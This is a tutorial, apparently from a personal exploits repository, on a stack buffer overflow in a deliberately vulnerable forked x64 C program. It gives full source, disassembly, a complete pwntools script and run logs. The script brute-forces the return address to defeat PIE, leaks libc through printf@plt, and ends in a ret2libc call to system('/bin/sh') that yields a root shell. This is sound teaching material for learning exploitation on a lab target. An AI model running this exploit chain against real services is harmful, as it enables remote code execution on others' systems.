# Exploits
## [UPDATE 16/07/2022] : If your program is stuck then change the function bruteforce_next_byte(payload) by :
```python
def bruteforce_next_byte(payload):
    for i in range(256):
        next_test = i
        next_test = bytes([next_test])
        test_payload = payload + next_test
        p.send(test_payload)
        output = p.recvuntil(input_msg)
        if exit_msg in output.decode():
            log.success("Found next byte : %s" % hex(i))
            return next_test
        if i == 255:
            log.fail("Failed to find next byte")
            exit()
        time.sleep(1) # Update 16/07/2022 : If the brute force is stuck then do this (you can also do : time.sleep(0.5) if it works too)
```

## Stack buffer overflow : Exploit forked programs (bruteforce and ret2plt) in x64 (No canary)
## Required to understand : Return to plt and Stack protections
## Bypasses protections : NX, ASLR and PIE
### Insight
Is there really a way to bypass Position Independant Executable ? Well, kind of, if the program uses `fork` then definitely  
Before seeing the exploit itself, we have to understand how does PIE really work, let's write the program that will be exploited :
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

void vuln(){
    char buffer[64];
    printf("Enter a string : ");
    fflush(stdout);
    read(STDIN_FILENO, buffer, 500);
    printf("Ended !\n");
    fflush(stdout);
}

int main()
{
    while(1) {
        if (fork() == 0) {
            vuln();
            printf("Program finished !\n");
            fflush(stdout);
            exit(0);
        } else {
            wait(NULL);
        }
    }
    return 0;
}
```
I will explain how `fork` works later, but first, there's something we've to overcome, let's enable (full) `ASLR` :
```sh
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
Now let's compile the program enabling `NX and PIE` in 64 bits :
```sh
gcc <source code file>.c -o <executable> -fno-stack-protector -z noexecstack -pie -fpie -m64
```
I disabled stack protector but in this condition, it can be bypassed but we'll see that later  
So how does `PIE` works ? Well it's a good question, let's disasseble the program using `objdump` :
```
objdump -d <executable>
```
With `PIE`
```nasm
0000000000001000 <_init>:
    1000:	48 83 ec 08          	sub    $0x8,%rsp
    1004:	48 8b 05 dd 2f 00 00 	mov    0x2fdd(%rip),%rax        # 3fe8 <__gmon_start__>
    100b:	48 85 c0             	test   %rax,%rax
    100e:	74 02                	je     1012 <_init+0x12>
    1010:	ff d0                	callq  *%rax
    1012:	48 83 c4 08          	add    $0x8,%rsp
    1016:	c3                   	retq   
```
Without `PIE` :
```nasm
0000000000401000 <_init>:
  401000:	48 83 ec 08          	sub    $0x8,%rsp
  401004:	48 8b 05 ed 2f 00 00 	mov    0x2fed(%rip),%rax        # 403ff8 <__gmon_start__>
  40100b:	48 85 c0             	test   %rax,%rax
  40100e:	74 02                	je     401012 <_init+0x12>
  401010:	ff d0                	callq  *%rax
  401012:	48 83 c4 08          	add    $0x8,%rsp
  401016:	c3                   	retq   
```
With `PIE` :
```nasm
00000000000010b0 <_start>:
    10b0:	31 ed                	xor    %ebp,%ebp
    10b2:	49 89 d1             	mov    %rdx,%r9
    10b5:	5e                   	pop    %rsi
    10b6:	48 89 e2             	mov    %rsp,%rdx
    10b9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
    10bd:	50                   	push   %rax
    10be:	54                   	push   %rsp
    10bf:	4c 8d 05 da 01 00 00 	lea    0x1da(%rip),%r8        # 12a0 <__libc_csu_fini>
    10c6:	48 8d 0d 73 01 00 00 	lea    0x173(%rip),%rcx        # 1240 <__libc_csu_init>
    10cd:	48 8d 3d 1d 01 00 00 	lea    0x11d(%rip),%rdi        # 11f1 <main>
    10d4:	ff 15 06 2f 00 00    	callq  *0x2f06(%rip)        # 3fe0 <__libc_start_main@GLIBC_2.2.5>
    10da:	f4                   	hlt    
    10db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
```
Without `PIE` :
```nasm
00000000004010a0 <_start>:
  4010a0:	31 ed                	xor    %ebp,%ebp
  4010a2:	49 89 d1             	mov    %rdx,%r9
  4010a5:	5e                   	pop    %rsi
  4010a6:	48 89 e2             	mov    %rsp,%rdx
  4010a9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  4010ad:	50                   	push   %rax
  4010ae:	54                   	push   %rsp
  4010af:	49 c7 c0 90 12 40 00 	mov    $0x401290,%r8
  4010b6:	48 c7 c1 30 12 40 00 	mov    $0x401230,%rcx
  4010bd:	48 c7 c7 de 11 40 00 	mov    $0x4011de,%rdi
  4010c4:	ff 15 26 2f 00 00    	callq  *0x2f26(%rip)        # 403ff0 <__libc_start_main@GLIBC_2.2.5>
  4010ca:	f4                   	hlt    
  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
```
It's the same structure for each function  
Well, what the did happen to our program ? Are `00000000000010b0` (`_start`) and `0000000000001000` (`_init`) real addresses ? Well, no see them more like offsets, actually what `PIE` will do is that it will apply to these addresses a random offset when the program is executed  
So this offset is called the `program base` and it's random at each execution  
So if the program base is for example `0x506f` then the real addresses would be offseted with this address, so the address will be : `0x506f` + `0x10b0` which gives `0x611f` and it will be the `real function address`  
Damn, then how could we execute functions or jump to gadgets or anything that refers to the code (`.text`) segment if it's address is random ? (Well, not fully random but you got it)  
Well do you remember when i was talking about `fork` ? It's gonna help us a lot against this mitigation, because fork7 is a function that will copy the entire memory of the process including all segments, it will actually clone the image of the process into a sub process  
What does it means ? Well all memory is copied, including this program base, so in this case it runs the program in an infinite loop so at each iteration of the loop, the sub-process will have **the same** program base, and then we can process some brute force stuff  
You're probably asking yourself about what we're gonna brute force ? I talk about the instruction pointer which will be the same at each fork, but how can we brute force the instruction pointer and how can that be useful ?  
It's actualy really simple, let's have a reprentation of the stack at this moment :
**Stack** :
```
---------------------------------------
EIP backup | 8 bytes => 0x 55 65 5c 3e 12 2a 1f 08 
EBP backup | 8 bytes
buffer     | 64 bytes
---------------------------------------
```
Now let's see a case where there's a buffer overflow, where we will overwrite full `EBP` backup but only the first byte of `EIP` so the payload will look like this :
```
|A*64       |B*8           |C*1           |
|buffer (64)|ebp backup (8)|eip backup (8)|
```
The stack will now look like this :
```
---------------------------------------
EIP backup | 8 bytes => 0x 55 65 5c 3e 12 2a 1f 43 ('C')
EBP backup | 8 bytes => B*8
buffer     | 64 bytes => A*8
---------------------------------------
```
We overwrote the last byte of `EIP` (not the first one because of little-endian that's why we have to reverse our bytes)  
Now, unless the address `0x 55 65 5c 3e 12 2a 1f 43` exists, the program will crash and will give a segmentation fault, but what if we try each value from `0` to `ff` (`255`) ?  
Well since it's one byte, at a moment, unless it's something else that caused the crash, it will be correct byte (that was in the original address that hasn't been overwrote)  
So in this case it's `08`, then since it's not crashing, we know that the byte that we've tested is correct, now that we have this first byte we can move into the second one keeping all the bytes before and again and so forth  
So let's try to find the second byte, keeping the first byte before, so the payload will look like this :
```
|A*64       |B*8           |0x08 + (?)    |
|buffer (64)|ebp backup (8)|eip backup (8)|
```
Since `?` is the unknown byte that we have to brute force, so when it arrives to `1f` (`31`), it will not crash and then we know that it's the good byte and we can move the next until the end of the address  
So the final (`8th`) payload will be :
```
|A*64       |B*8           |0x08 1f 2a 12 3e 5c 65 55|
|buffer (64)|ebp backup (8)|eip backup (8)           |
```
And `0x55655c3e122a1f08` is the address of `RIP`  
Awesome ! But now how can we find the program base from `RIP`, well we will have to do a calculation : `base address = RIP - (RIP & 0xfff) - _init functon address`  
So we substract `RIP` with (`RIP` bitwise and with `0xfff`) then we substract from it the `_init` function address, i'm talking about it's offset, it's generally `0x1000` but we can check using either gdb or objdump :  
```
gdb <executable>
x _init
```
For me it was indeed `0x1000`  
So now with this calculation we have the program base address and we can then find the address of any function in `.text` simply by getting it's offset (for example `0x10b0`) + the program base address  
So we've defeated `PIE` using a byte per byte brute force, yes it's similar to the brute force when you're doing a blind SQL injection with the true / false operator but it's not really the same  
### Exploitation
So let's go, let's move on into the exploit  
Let's first import pwntools and do some preparative stuff :
```python
#!/usr/bin/env python3

from pwn import *
import time
p = process("<executable>")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
```
We'll also define some constants to define the messages that're printed :
```python
input_msg = b"Enter a string : " # Message of input
end_msg = b"Ended !\n" # Message after reed
exit_msg = "Program finished !\n" # Message when forked program finish
```
You can see that i have also imported `libc`, that's exactly the same purpose for the ret2plt exploit, we just want some addresses (offsets )from libc, so for example the offset of `printf` we couldn't take it from the binary because there's also `ASLR`  
The first thing we need is of course the offset before overwriting the `RIP` backup :
```python
padding = b'A'*(64+8)
```
For me the offset between between the buffer address and EIP backup address is always `8`  
The first thing we have to do is to brute force `RIP`, such as described earler, it's the same technique, we will have a `RIP` variable which will be empty, then we will have a loop that iterates 8 times (8 for the 8 bytes of the address), at each iteration we will brute force the current byte by sending all the previous ones followed by the current one  
So let's create a function that will brute force from `0` to `255` :
```python
def bruteforce_next_byte(payload):
    for i in range(256):
        next_test = i
        next_test = bytes([next_test])
        test_payload = payload + next_test
        p.send(test_payload)
        output = p.recvuntil(input_msg)
        if exit_msg in output.decode():
            log.success("Found next byte : %s" % hex(i))
            return next_test
        if i == 255:
            log.fail("Failed to find next byte")
            exit()
        time.sleep(1) # Update 16/07/2022 : If the brute force is stuck then do this (you can also do : time.sleep(0.5) if it works too)
```
It's simple, it will just loop on 256 iterations, the payload that we'll send is the base payload followed by the current iteration byte, if it prints the `exit_msg` ("Ended !\n") then we know that it's the good byte and we can return it  
So let's now use this function in another final brute force function that can brute force a certain length :
```python
def brute_force_bytes(payload, length):
    out = b''
    for i in range(length):
        out = out + bruteforce_next_byte(payload + out)
    ret = u64(out.ljust(8, b"\x00")) # we fill the empty bytes (if their exists) with 0x00
    return ret
```
Now we can simply use this method to brute force `RIP` :
```python
log.info("Brute forcing RIP...")
rip = brute_force_bytes(payload, 8)
log.info(f"Found rip value: {hex(rip)}")
```
Let's launch the exploit and let's see what it gived :
```bash
python exploit.py
```
```
[*] Brute forcing RIP...
[+] Found next byte : 0x8
[+] Found next byte : 0xb2
[+] Found next byte : 0x31
[+] Found next byte : 0x1f
[+] Found next byte : 0x9e
[+] Found next byte : 0x55
[+] Found next byte : 0x0
[+] Found next byte : 0x0
[*] Found rip value: 0x559e1f31b208
```
Looks like it did find it ! You can also see that there are 2 null bytes at the start of the address and that the address that is printed at the end length 6 bytes, that's interesting, if we launch it again may times it's the same, so we could just not brute force them  
Alright, now we need to find the program base address, we will use the calculation that i've mentionned before, but we need to find the `_init` function address, i will simply use gdb for that :
```
gdb <executable>
# (gdb)>
x _init
```
```
0x1000 <_init>:	0x08ec8348
```
It gived me `0x1000` and there's a good chance that it gave the same thing for you, so let's save it in a variable at the head of the program beside the program messages constants :
```python
_init_addr = 0x1000
```
And then let's find the program base :
```python
base_address = rip - (rip & 0xfff) - _init_addr
log.success("Found program base address : "+hex(base_address))
```
Now that we have the actual base address, we've defeated PIE !  
Because from this address, we can find all the `.text` functions addresses applying the program base to their offset  
So what i will do here is a `ret2plt` to first find the libc base  
So we need three offsets : 
- `main` function offset :
```
gdb <executable>
# (gdb)>
x main
```
```
0x11f1 <main>:	0xe5894855
```
So for me it's `0x11f1`  
- `printf@plt` and `printf@got` offsets :
```
gdb <executable>
# (gdb)>
disass vuln
```
```nasm
Dump of assembler code for function vuln:
   0x0000000000001195 <+0>:	push   rbp
   0x0000000000001196 <+1>:	mov    rbp,rsp
   0x0000000000001199 <+4>:	sub    rsp,0x40
   0x000000000000119d <+8>:	lea    rdi,[rip+0xe60]        # 0x2004
   0x00000000000011a4 <+15>:	mov    eax,0x0
   0x00000000000011a9 <+20>:	call   0x1040 <printf@plt> <---------------------------------------------------
   0x00000000000011ae <+25>:	mov    rax,QWORD PTR [rip+0x2eab]        # 0x4060 <stdout@GLIBC_2.2.5>
   0x00000000000011b5 <+32>:	mov    rdi,rax
   0x00000000000011b8 <+35>:	call   0x1060 <fflush@plt>
   0x00000000000011bd <+40>:	lea    rax,[rbp-0x40]
   0x00000000000011c1 <+44>:	mov    edx,0x1f4
   0x00000000000011c6 <+49>:	mov    rsi,rax
   0x00000000000011c9 <+52>:	mov    edi,0x0
   0x00000000000011ce <+57>:	call   0x1050 <read@plt>
   0x00000000000011d3 <+62>:	lea    rdi,[rip+0xe3c]        # 0x2016
   0x00000000000011da <+69>:	call   0x1030 <puts@plt>
   0x00000000000011df <+74>:	mov    rax,QWORD PTR [rip+0x2e7a]        # 0x4060 <stdout@GLIBC_2.2.5>
   0x00000000000011e6 <+81>:	mov    rdi,rax
   0x00000000000011e9 <+84>:	call   0x1060 <fflush@plt>
   0x00000000000011ee <+89>:	nop
   0x00000000000011ef <+90>:	leave  
   0x00000000000011f0 <+91>:	ret    
End of assembler dump.
```
So `printf@plt` is `0x1040`
```
disass 0x1040
```
```
Dump of assembler code for function printf@plt:
   0x0000000000001040 <+0>:	jmp    QWORD PTR [rip+0x2fda]        # 0x4020 <printf@got.plt> <-----------------------
   0x0000000000001046 <+6>:	push   0x1
   0x000000000000104b <+11>:	jmp    0x1020
End of assembler dump.
```
`printf@got` is `0x4020`  
- A `pop rdi ; ret` gadget offset :
```
ROPgadget --binary <executable> | grep "pop rdi"
```
```
0x000000000000129b : pop rdi ; ret
```
So `pop rdi ; ret` gadget is at 0x129b`  
Okay now let's add them at the head of the exploit script code :
```python
raw_main_addr = 0x11f1 # main function | (gdb)> x main
raw_printf_addr = 0x1030 # printf@plt
raw_printf_got_addr = 0x4020 # printf@got
raw_pop_rdi_gadget_addr = 0x129b # ROPgadget --binary <exec> | grep "pop rdi ; rdi"
```
By `raw` i mean `offset`  
Now for each of these addresses, let's find their real address using the program base offset :
```python
REAL_MAIN_PLT_ADDR = base_address + raw_main_addr
REAL_PRINTF_PLT_ADDR = base_address + raw_printf_addr
REAL_PRINTF_GOT_ADDR = base_address + raw_printf_got_addr
REAL_POP_RDI_GADGET_ADDR = base_address + raw_pop_rdi_gadget_addr

log.info("Found main function address : " + hex(REAL_MAIN_PLT_ADDR))
log.info("Found printf@plt address : " + hex(REAL_PRINTF_PLT_ADDR))
log.info("Found pop rdi ; ret gadget address : " + hex(REAL_POP_RDI_GADGET_ADDR))
```
Let's see what it gives :
```
python exploit.py
```
```
[+] Found program base address : 0x561056627000
[*] Found main function address : 0x5610566281f1
[*] Found printf@plt address : 0x561056628030
[*] Found pop rdi ; ret gadget address : 0x56105662829b
```
Looks perfect, let's launch the exploit again and see if it changes :
```
[+] Found program base address : 0x56250811f000
[*] Found main function address : 0x5625081201f1
[*] Found printf@plt address : 0x562508120030
[*] Found pop rdi ; ret gadget address : 0x56250812029b
```
They're a little similar but not the same, so that's nice !  
Now we have to find the libc base, i will create a function for that :
```python
def find_libc_base(buffer_payload, func_got_addr, func_name):
    # Create rop chain
    rop = buffer_payload
    rop += p64(REAL_POP_RDI_GADGET_ADDR)
    rop += p64(func_got_addr) # args[0] -> RDI
    rop += p64(REAL_PRINTF_PLT_ADDR) # printf()
    rop += p64(REAL_MAIN_PLT_ADDR) # main()

    # Send our rop-chain payload
    print(p.clean())
    p.sendline(rop)

    # Parse leaked address
    leaked_string = p.recvuntil(input_msg)
    #print("Raw leak : "+get_bytes(leaked_string))
    recieved = leaked_string.replace(input_msg, b"").strip()
    recieved = recieved.replace(end_msg, b"").strip()
    leak = u64(recieved.ljust(8, b"\x00"))
    log.info("Leaked libc address of 0x"+hex(func_got_addr)+"@GOT : "+hex(leak))

    libc_addr = -1
    if libc != "":
        libc_addr = leak - libc.symbols[func_name]

    return libc_addr
```
It's simple, it just prints the address which `<function>@GOT` points to which is `<function>` in libc then we substract it's offset in libc to get the libc base, the function can be anything, we just have to know it's name and it's `GOT` address  
So let's use it :
```python
libc_base_addr = find_libc_base(payload, REAL_PRINTF_GOT_ADDR, "printf")
log.info("Found libc base address : "+hex(libc_base_addr))
```
Now let's just find `"/bin/sh"` string and `system` address from this `libc` base :
```python
BIN_SH = libc_base_addr + next(libc.search(b"/bin/sh"))
log.success("Found \"/bin/sh\" string address in libc : "+hex(BIN_SH))
SYSTEM = libc_base_addr + libc.sym["system"]
log.success("Found system function address in libc : "+hex(SYSTEM))
```
Let's see what it gives :
```
[*] Leaked libc address of 0x0x562508123020@GOT : 0x7f0ec2eeccf0
[*] Found libc base address : 0x7f0ec2e96000
[+] Found "/bin/sh" string address in libc : 0x7f0ec3020156
[+] Found system function address in libc : 0x7f0ec2edee50
```
Awesome, finally, from all that leaks, we can do our ret2libc :
```python
pay = payload # payload = padding
pay += p64(REAL_POP_RDI_GADGET_ADDR) # pop rdi ; ret
pay += p64(BIN_SH) # RDI => "/bin/sh"
pay += p64(SYSTEM) # system(args[0]) -> system(RDI) -> system("/bin/sh")
```
We can then send the final payload, with a timeout of 0.5 seconds just to be sure that everything is good :
```python
time.sleep(0.5)

print(p.clean())
p.sendline(pay)

print(p.clean())
# User input
p.interactive()
```
There is the final exploit that i used :
```python
#!/usr/bin/env python3

from pwn import *
import time
# NOTE: this path cannot contain spaces
process_name = './vuln'

input_msg = b"Enter a string : "
end_msg = b"Ended !\n"
exit_msg = "Program finished !\n"
_init_addr = 0x1000
raw_main_addr = 0x11f1 # main function | (gdb)> x main
raw_printf_addr = 0x1030 # printf@plt
raw_printf_got_addr = 0x4020 # printf@got
raw_pop_rdi_gadget_addr = 0x129b # ROPgadget --binary <exec> | grep "pop rdi ; rdi"

p = process(process_name)

elf = ELF(process_name) # Extract data from binary

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(elf) # Find ROP gadgets

def find_libc_base(buffer_payload, func_got_addr, func_name):
    # Create rop chain
    rop = buffer_payload
    rop += p64(REAL_POP_RDI_GADGET_ADDR)
    rop += p64(func_got_addr) # args[0] -> RDI
    rop += p64(REAL_PRINTF_PLT_ADDR) # printf()
    rop += p64(REAL_MAIN_PLT_ADDR) # main()

    # Send our rop-chain payload
    print(p.clean())
    p.sendline(rop)

    # Parse leaked address
    leaked_string = p.recvuntil(input_msg)
    #print("Raw leak : "+get_bytes(leaked_string))
    recieved = leaked_string.replace(input_msg, b"").strip()
    recieved = recieved.replace(end_msg, b"").strip()
    leak = u64(recieved.ljust(8, b"\x00"))
    log.info("Leaked libc address of 0x"+hex(func_got_addr)+"@GOT : "+hex(leak))

    libc_addr = -1
    if libc != "":
        libc_addr = leak - libc.symbols[func_name] # Save libc base

    return libc_addr

def get_bytes(s):
    return str(",".join("0x{:02x}".format(c) for c in s))

def bruteforce_next_byte(payload):
    for i in range(256):
        next_test = i
        next_test = bytes([next_test])
        test_payload = payload + next_test
        p.send(test_payload)
        output = p.recvuntil(input_msg)
        if exit_msg in output.decode():
            log.success("Found next byte : %s" % hex(i))
            return next_test
        if i == 255:
            log.fail("Failed to find next byte")
            exit()
        time.sleep(1) # or time.sleep(0.5) if it works
def brute_force_bytes(payload, length):
    out = b''
    for i in range(length):
        out = out + bruteforce_next_byte(payload + out)
    ret = u64(out.ljust(8, b"\x00")) # we fill the empty bytes (if their exists) with 0x00
    return ret

padding = b'A'*(64+8)

p.clean()
payload = padding

log.info("Brute forcing RIP...")
rip = brute_force_bytes(payload, 8)
log.info(f"Found rip value: {hex(rip)}")

# We also need to substract _init address from them all
base_address = rip - (rip & 0xfff) - _init_addr
log.success("Found program base address : "+hex(base_address))
# Now that we have the actual base address, we've defeated PIE
REAL_MAIN_PLT_ADDR = base_address + raw_main_addr
REAL_PRINTF_PLT_ADDR = base_address + raw_printf_addr
REAL_PRINTF_GOT_ADDR = base_address + raw_printf_got_addr
REAL_POP_RDI_GADGET_ADDR = base_address + raw_pop_rdi_gadget_addr

log.info("Found main function address : " + hex(REAL_MAIN_PLT_ADDR))
log.info("Found printf@plt address : " + hex(REAL_PRINTF_PLT_ADDR))
log.info("Found pop rdi ; ret gadget address : " + hex(REAL_POP_RDI_GADGET_ADDR))

libc_base_addr = find_libc_base(payload, REAL_PRINTF_GOT_ADDR, "printf")
log.info("Found libc base address : "+hex(libc_base_addr))

BIN_SH = libc_base_addr + next(libc.search(b"/bin/sh"))
log.success("Found \"/bin/sh\" string address in libc : "+hex(BIN_SH))
SYSTEM = libc_base_addr + libc.sym["system"]
log.success("Found system function address in libc : "+hex(SYSTEM))

pay = payload
pay += p64(REAL_POP_RDI_GADGET_ADDR)
pay += p64(BIN_SH)
pay += p64(SYSTEM)

time.sleep(0.5)

print(p.clean())
p.sendline(pay)

print(p.clean())
# User input
p.interactive()
```
Let's launch that :
```bash
[*] Brute forcing RIP...
[+] Found next byte : 0x8
[+] Found next byte : 0x2
[+] Found next byte : 0x20
[+] Found next byte : 0x84
[+] Found next byte : 0xbe
[+] Found next byte : 0x55
[+] Found next byte : 0x0
[+] Found next byte : 0x0
[*] Found rip value: 0x55be84200208
[+] Found program base address : 0x55be841ff000
[*] Found main function address : 0x55be842001f1
[*] Found printf@plt address : 0x55be84200030
[*] Found pop rdi ; ret gadget address : 0x55be8420029b
b''
[*] Leaked libc address of 0x0x55be84203020@GOT : 0x7fcdda55bcf0
[*] Found libc base address : 0x7fcdda505000
[+] Found "/bin/sh" string address in libc : 0x7fcdda68f156
[+] Found system function address in libc : 0x7fcdda54de50
b''
b'Ended !\n'
[*] Switching to interactive mode
$ whoami
root
$ id
uid=0(root) gid=0(root) groups=0(root),142(kaboxer)
$  
```
Thanks for reading !
